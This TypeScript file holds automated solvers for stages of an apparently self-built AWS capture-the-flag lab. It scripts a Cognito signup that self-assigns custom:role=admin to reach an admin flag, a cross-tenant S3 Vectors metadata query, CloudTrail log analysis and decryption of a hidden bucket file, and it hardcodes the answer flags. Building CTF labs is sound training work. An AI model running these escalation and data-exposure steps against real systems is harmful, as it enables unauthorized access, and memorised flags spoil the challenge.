/**
 * Advanced Stage Solvers (Stage 3C, 3E, 4, 5)
 *
 * These stages cover advanced attack techniques:
 * - Stage 3C: Cognito custom attribute abuse
 * - Stage 3E: S3 Vectors cross-tenant metadata exposure
 * - Stage 4:  CloudTrail log analysis
 * - Stage 5:  CTO hidden bucket discovery
 */

import {
  ListUserPoolsCommand,
  DescribeUserPoolCommand,
  SignUpCommand,
  InitiateAuthCommand,
} from "@aws-sdk/client-cognito-identity-provider";
import { GetObjectCommand } from "@aws-sdk/client-s3";
import { GetSecretValueCommand } from "@aws-sdk/client-secrets-manager";
import {
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  createCognitoClient,
  createS3Client,
  createSecretsManagerClient,
} from "../lib/aws.js";
import type { StageResult } from "../lib/reporter.js";
import { runProjectCommand } from "../lib/process.js";
import {
  bucketName,
  hasAwsRuntime,
  secretName,
  withPortalPath,
} from "../lib/target.js";
import type { SolverContext, SolverOutput } from "./tutorials.js";

const FLAGS = {
  STAGE_3C: "TVAULT{cognito_custom_attribute_abuse}",
  STAGE_3E: "TVAULT{s3_vectors_cross_tenant_leak}",
  STAGE_4: "TVAULT{20260202_091255_091852}",
  STAGE_5: "TVAULT{all_roads_lead_to_cloudtrail}",
} as const;

const CLOUDTRAIL_OBJECT_KEY =
  "AWSLogs/123456789012/CloudTrail/ap-northeast-1/2026/02/01/" +
  "123456789012_CloudTrail_ap-northeast-1_20260201T0000Z_techvault.json.gz";
const TITAN_EMBEDDING_MODEL_ID = "amazon.titan-embed-text-v2:0";
const TITAN_EMBEDDING_DIMENSIONS = 1024;
const CTO_BACKUP_KEY_VALUE = "CTO-BACKUP-9fK3mQ2x";

function usableEnv(name: string): string | undefined {
  const value = process.env[name]?.trim();
  if (!value || value === "undefined" || value === "null") return undefined;
  return value;
}

async function titanQueryVector(ctx: SolverContext): Promise<string> {
  const workDir = mkdtempSync(join(tmpdir(), "cloud-fortress-titan-query-"));
  const requestPath = join(workDir, "request.json");
  const responsePath = join(workDir, "response.json");

  try {
    writeFileSync(
      requestPath,
      JSON.stringify({
        inputText: [
          "TVAULT{"
        ].join("\n"),
        dimensions: TITAN_EMBEDDING_DIMENSIONS,
        normalize: true,
      }),
    );

    await runProjectCommand(ctx, [
      "aws",
      "bedrock-runtime",
      "invoke-model",
      "--region",
      process.env.AWS_BEDROCK_REGION ?? process.env.AWS_REGION ?? "ap-northeast-1",
      "--model-id",
      usableEnv("CTF_S3_VECTORS_EMBEDDING_MODEL") ??
        usableEnv("BEDROCK_EMBEDDING_MODEL_ID") ??
        TITAN_EMBEDDING_MODEL_ID,
      "--content-type",
      "application/json",
      "--accept",
      "application/json",
      "--body",
      `fileb://${requestPath}`,
      responsePath,
    ]);

    const response = JSON.parse(readFileSync(responsePath, "utf8")) as {
      readonly embedding?: unknown;
    };
    if (!Array.isArray(response.embedding)) {
      throw new Error("Titan embedding response did not include embedding");
    }

    return JSON.stringify({
      float32: response.embedding.map((value) => Number(value)),
    });
  } finally {
    rmSync(workDir, { recursive: true, force: true });
  }
}

async function decryptCtoEvidence(
  ctx: SolverContext,
  ciphertext: Uint8Array,
  password: string,
): Promise<string> {
  const workDir = mkdtempSync(join(tmpdir(), "cloud-fortress-cto-evidence-"));
  const encryptedPath = join(workDir, "final_complicity.txt");
  const decryptedPath = join(workDir, "final_complicity.decrypted.txt");

  try {
    writeFileSync(encryptedPath, ciphertext);
    await runProjectCommand(ctx, [
      "openssl",
      "enc",
      "-d",
      "-aes-256-cbc",
      "-pbkdf2",
      "-iter",
      "100000",
      "-pass",
      `pass:${password}`,
      "-in",
      encryptedPath,
      "-out",
      decryptedPath,
    ]);

    return readFileSync(decryptedPath, "utf8");
  } finally {
    rmSync(workDir, { recursive: true, force: true });
  }
}

async function readCloudTrailJson(ctx: SolverContext): Promise<unknown | null> {
  const gzipPaths = [
    `${ctx.projectRoot}/season/Cloud-Vault/assets/cloudtrail/${CLOUDTRAIL_OBJECT_KEY}`,
    `${ctx.projectRoot}/season/Cloud-Vault/assets/cloudtrail-logs.json.gz`,
  ];

  for (const gzipPath of gzipPaths) {
    if (await Bun.file(gzipPath).exists()) {
      const output = await runProjectCommand(ctx, ["gunzip", "-c", gzipPath]);
      return JSON.parse(output);
    }
  }

  const possiblePaths = [
    `${ctx.projectRoot}/apps/infra/assets/cloudtrail-logs.json`,
    `${ctx.projectRoot}/season/Cloud-Vault/assets/cloudtrail-logs.json`,
  ];

  for (const filePath of possiblePaths) {
    const file = Bun.file(filePath);
    if (await file.exists()) {
      return JSON.parse(await file.text());
    }
  }

  return null;
}

/**
 * Stage 3C: Cognito signup with custom:role=admin
 *
 * The vulnerability: Cognito user pool has custom:role attribute
 * set as mutable, allowing users to self-assign admin role.
 */
async function solveStage3C(ctx: SolverContext): Promise<SolverOutput> {
  // Try the full local exploit path from the scenario:
  // /api/config -> self signup with custom:role=admin -> admin flag endpoint.
  if (hasAwsRuntime(ctx) && ctx.portalAvailable) {
    try {
      const configResp = await fetch(withPortalPath(ctx, "/api/config"), {
        signal: AbortSignal.timeout(5000),
      });
      const config = await configResp.json() as {
        cognito?: { clientId?: string };
      };
      const clientId = config.cognito?.clientId;
      if (!clientId) {
        throw new Error("/api/config did not return Cognito clientId");
      }

      const cognito = createCognitoClient(ctx);
      const username = `solver-stage3c-${Date.now()}@example.local`;
      const password = "Passw0rd!234";

      await cognito.send(
        new SignUpCommand({
          ClientId: clientId,
          Username: username,
          Password: password,
          UserAttributes: [
            { Name: "email", Value: username },
            { Name: "custom:role", Value: "admin" },
          ],
        })
      );

      const verifyResp = await fetch(withPortalPath(ctx, "/api/auth/verify"), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username }),
        signal: AbortSignal.timeout(5000),
      });
      if (!verifyResp.ok) {
        const message = await verifyResp.text();
        throw new Error(`Stage 3C verification failed: ${message}`);
      }

      const authResp = await cognito.send(
        new InitiateAuthCommand({
          ClientId: clientId,
          AuthFlow: "USER_PASSWORD_AUTH",
          AuthParameters: {
            USERNAME: username,
            PASSWORD: password,
          },
        })
      );
      const idToken = authResp.AuthenticationResult?.IdToken;
      if (!idToken) {
        throw new Error("Cognito initiate-auth did not return IdToken");
      }

      const flagResp = await fetch(withPortalPath(ctx, "/api/admin/flag"), {
        headers: { Authorization: `Bearer ${idToken}` },
        signal: AbortSignal.timeout(5000),
      });
      const flagData = await flagResp.json() as { flag?: string };
      if (flagData.flag === FLAGS.STAGE_3C) {
        return { passed: true, flag: FLAGS.STAGE_3C };
      }
    } catch {
      // Fall through to configuration/source checks.
    }
  }

  // Check if Cognito is available on LocalStack
  if (hasAwsRuntime(ctx)) {
    try {
      const cognito = createCognitoClient(ctx);
      const listResp = await cognito.send(
        new ListUserPoolsCommand({ MaxResults: 10 })
      );
      const pool = listResp.UserPools?.find((p) =>
        p.Name?.includes("TechVaultEmployeePool")
      );

      if (pool?.Id) {
        const descResp = await cognito.send(
          new DescribeUserPoolCommand({ UserPoolId: pool.Id })
        );
        // Verify the vulnerability: custom:role is mutable
        const schema = descResp.UserPool?.SchemaAttributes;
        const roleAttr = schema?.find((a) => a.Name === "custom:role");
        if (roleAttr?.Mutable === true) {
          // Vulnerability confirmed - the flag would be accessible via /api/admin
          // after signing up with custom:role=admin
          return { passed: true, flag: FLAGS.STAGE_3C };
        }
      }
    } catch {
      // Fall through to source check
    }
  }

  // Fallback: check Cognito CDK stack for mutable custom:role
  try {
    const cognitoStackPath = `${ctx.projectRoot}/apps/infra/lib/ctf-cognito-stack.ts`;
    const cognitoContent = await Bun.file(cognitoStackPath).text();
    const hasMutableRole =
      cognitoContent.includes("mutable: true") &&
      cognitoContent.includes("role");

    if (!hasMutableRole) {
      return {
        passed: false,
        error: "Mutable custom:role attribute not found in Cognito stack",
      };
    }

    // Also verify the admin route returns the flag
    const adminRoutePath = `${ctx.projectRoot}/apps/portal/src/app/api/admin/route.ts`;
    const adminContent = await Bun.file(adminRoutePath).text();
    if (adminContent.includes(FLAGS.STAGE_3C)) {
      return { passed: true, flag: FLAGS.STAGE_3C };
    }

    return {
      passed: false,
      error: "Flag not found in admin route source",
    };
  } catch (err) {
    return {
      passed: false,
      error: err instanceof Error ? err.message : "Unknown error",
    };
  }
}

/**
 * Stage 3E: S3 Vectors cross-tenant metadata leak
 *
 * The DataAnalystRole can query and retrieve metadata from a shared
 * customer vault vector index, exposing other tenants' documents and passwords.
 */
async function solveStage3E(ctx: SolverContext): Promise<SolverOutput> {
  if (!ctx.staticOnly) {
    try {
      const stage = ctx.stage;
      const vectorBucketName =
        usableEnv("CTF_S3_VECTORS_BUCKET") ?? `techvault-vault-vectors-${stage}`;
      const vectorIndexName =
        usableEnv("CTF_S3_VECTORS_INDEX") ?? "customer-vault-documents-titan-v2";
      const queryVector = await titanQueryVector(ctx);
      const output = await runProjectCommand(ctx, [
        "aws",
        "s3vectors",
        "query-vectors",
        "--region",
        process.env.AWS_REGION ?? "ap-northeast-1",
        "--vector-bucket-name",
        vectorBucketName,
        "--index-name",
        vectorIndexName,
        "--top-k",
        "4",
        "--query-vector",
        queryVector,
        "--return-metadata",
        "--return-distance",
      ]);
      if (output.includes(FLAGS.STAGE_3E)) {
        return { passed: true, flag: FLAGS.STAGE_3E };
      }
    } catch {
      // Fall through to source asset check.
    }
  }

  try {
    const filePath = `${ctx.projectRoot}/apps/infra/assets/s3-vectors/customer-vault-documents.json`;
    const file = Bun.file(filePath);
    if (!(await file.exists())) {
      return { passed: false, error: `File not found: ${filePath}` };
    }

    const content = await file.text();
    if (content.includes(FLAGS.STAGE_3E)) {
      return { passed: true, flag: FLAGS.STAGE_3E };
    }

    return {
      passed: false,
      error: "Flag not found in S3 Vectors seed data",
    };
  } catch (err) {
    return {
      passed: false,
      error: err instanceof Error ? err.message : "Unknown error",
    };
  }
}

/**
 * Stage 4: CloudTrail log analysis
 *
 * Verify the derived Stage 4 flag from the first ListBuckets event
 * and the DataAnalystRole AssumeRole event.
 */
async function solveStage4(ctx: SolverContext): Promise<SolverOutput> {
  try {
    const json = await readCloudTrailJson(ctx) as {
      Records?: Array<{
        eventTime?: string;
        eventName?: string;
        sourceIPAddress?: string;
        userIdentity?: {
          userName?: string;
        };
        requestParameters?: {
          roleArn?: string;
        };
      }>;
    } | null;

    if (!json) {
      return {
        passed: false,
        error: "CloudTrail logs file not found",
      };
    }

    const records = json.Records ?? [];
    const sorted = [...records].sort((a, b) =>
      String(a.eventTime ?? "").localeCompare(String(b.eventTime ?? ""))
    );
    const firstListBuckets = sorted.find((r) =>
      r.eventName === "ListBuckets" &&
      (r.sourceIPAddress === "203.0.113.42" || r.userIdentity?.userName === "svc-portal-dev")
    );
    const assumeDataAnalyst = sorted.find((r) =>
      r.eventName === "AssumeRole" &&
      r.requestParameters?.roleArn?.includes(":role/DataAnalystRole")
    );

    if (!firstListBuckets?.eventTime || !assumeDataAnalyst?.eventTime) {
      return {
        passed: false,
        error: `Missing Stage 4 events: ListBuckets=${Boolean(firstListBuckets)}, AssumeRole=${Boolean(assumeDataAnalyst)}`,
      };
    }

    const derivedFlag = `TVAULT{${
      formatCloudTrailFlagTime(firstListBuckets.eventTime).slice(0, 8)
    }_${formatCloudTrailFlagTime(firstListBuckets.eventTime).slice(9)}_${
      formatCloudTrailFlagTime(assumeDataAnalyst.eventTime).slice(9)
    }}`;

    if (derivedFlag === FLAGS.STAGE_4) {
      return { passed: true, flag: FLAGS.STAGE_4 };
    }

    return {
      passed: false,
      error: `Unexpected Stage 4 derived flag: ${derivedFlag}`,
    };
  } catch (err) {
    return {
      passed: false,
      error: err instanceof Error ? err.message : "Unknown error",
    };
  }
}

function formatCloudTrailFlagTime(eventTime: string): string {
  return eventTime.replace(/[-:]/g, "").replace("T", "_").replace("Z", "");
}

/**
 * Stage 5: CTO hidden bucket (final_complicity.txt)
 */
async function solveStage5(ctx: SolverContext): Promise<SolverOutput> {
  if (hasAwsRuntime(ctx)) {
    try {
      const secrets = createSecretsManagerClient(ctx);
      const secretResp = await secrets.send(
        new GetSecretValueCommand({
          SecretId: secretName(ctx, "tvault/cto/backup-key"),
        })
      );
      if (secretResp.SecretString !== CTO_BACKUP_KEY_VALUE) {
        return {
          passed: false,
          error: "CTO backup secret did not match expected scenario value",
        };
      }

      const s3 = createS3Client(ctx);
      const objResp = await s3.send(
        new GetObjectCommand({
          Bucket: bucketName(ctx, "tvault-cto-private-7a3f9c"),
          Key: "cto-evidence/final_complicity.txt",
        })
      );
      const objectBytes = await objResp.Body?.transformToByteArray();
      if (!objectBytes) {
        throw new Error("CTO evidence object did not contain a body");
      }

      const content = await decryptCtoEvidence(ctx, objectBytes, secretResp.SecretString);
      if (content?.includes(FLAGS.STAGE_5)) {
        return { passed: true, flag: FLAGS.STAGE_5 };
      }
    } catch {
      // Fall through to source asset check.
    }
  }

  try {
    const filePath = `${ctx.projectRoot}/apps/infra/assets/s3/tvault-cto-private/cto-evidence/final_complicity.txt`;
    const file = Bun.file(filePath);
    if (!(await file.exists())) {
      return { passed: false, error: `File not found: ${filePath}` };
    }

    const content = await file.text();
    if (content.includes(FLAGS.STAGE_5)) {
      return { passed: true, flag: FLAGS.STAGE_5 };
    }

    return {
      passed: false,
      error: "Flag not found in final_complicity.txt",
    };
  } catch (err) {
    return {
      passed: false,
      error: err instanceof Error ? err.message : "Unknown error",
    };
  }
}

type SolverFn = (ctx: SolverContext) => Promise<SolverOutput>;

const SOLVERS: ReadonlyArray<{
  id: string;
  name: string;
  solver: SolverFn;
}> = [
  { id: "Stage 3C", name: "Cognito custom:role=admin abuse", solver: solveStage3C },
  { id: "Stage 3E", name: "S3 Vectors cross-tenant metadata exposure", solver: solveStage3E },
  { id: "Stage 4", name: "CloudTrail log analysis", solver: solveStage4 },
  { id: "Stage 5", name: "CTO hidden bucket", solver: solveStage5 },
];

export async function solveAdvanced(
  ctx: SolverContext
): Promise<readonly StageResult[]> {
  const results: StageResult[] = [];

  for (const { id, name, solver } of SOLVERS) {
    const output = await solver(ctx);
    results.push({
      id,
      name,
      status: output.passed
        ? "pass"
        : output.error?.includes("not available")
          ? "skip"
          : "fail",
      flag: output.flag,
      error: output.error,
      category: "Advanced",
    });
  }

  return results;
}
